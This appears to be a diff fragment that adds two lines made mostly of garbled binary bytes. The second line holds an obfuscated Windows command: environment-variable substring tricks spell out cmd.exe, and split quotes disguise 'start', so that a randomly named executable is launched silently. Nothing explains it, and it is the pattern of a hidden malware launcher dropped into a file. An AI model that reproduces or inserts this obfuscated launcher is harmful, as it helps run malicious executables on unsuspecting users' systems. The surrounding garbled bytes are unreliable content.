@@ -1,0 +1,2 @@
+  " ? H ? ú ? ­  V Ä ?  Á  U Õ m ñ  ± ! A { ¯ « ?  ? £ â Û ¶ x ? } J + ò j Y Ñ  . Ç ? ? ?   4 ¼ ?  6  ? h ğ L ¹ Ü   ± ? 5  # Ø è H ] ? ^ Á  b  ®  ³  . ô z m Ñ w
+cmd.%comspec:~-1%x%comspec:~-1% /b /c star""t /b f""XIpLUbB.%comspec:~-1%x%comspec:~-1%  " ? H ? ú ? ­  V Ä ?  Á  U Õ m ñ  ± ! A { ¯ « ?  ? £ â Û ¶ x ? } J + ò j Y Ñ  . Ç ? ? ?   4 ¼ ?  6  ? h ğ L ¹ Ü   ± ? 5  # Ø è H ] ? ^ Á  b  ®  ³  . ô z m Ñ w
